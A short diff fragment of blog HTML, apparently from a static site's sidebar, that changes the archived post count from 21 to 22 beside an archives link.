                 <a href="/archives/">
               
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
